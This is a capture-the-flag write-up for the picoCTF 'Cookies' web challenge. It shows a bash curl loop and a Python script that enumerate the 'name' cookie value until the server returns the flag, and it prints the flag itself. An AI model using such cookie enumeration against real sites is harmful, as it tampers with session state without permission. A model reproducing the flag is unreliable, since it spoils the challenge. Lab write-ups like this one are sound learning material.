## Descripcion

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)
## Solucion
``` bash
┌──(kali㉿kali)-[~]
└─$ for i in {1..20}; do  curl -s http://mercury.picoctf.net:6418/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>

```

``` python 
import requests

url = "http://mercury.picoctf.net:6418/check"

for i in range(21):
        cookie = {"name":f"{i}"}
        r = requests.get(url, cookies=cookie)
        if "picoCTF{" in r.text:
                print(r.text)
```

``` bash
┌──(kali㉿kali)-[~]
└─$ python exploid.py
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>

```

## Bandera

picoCTF{3v3ry1_l0v3s_c00k135_88acab36}

## Notas adicionales
|

## Referencias
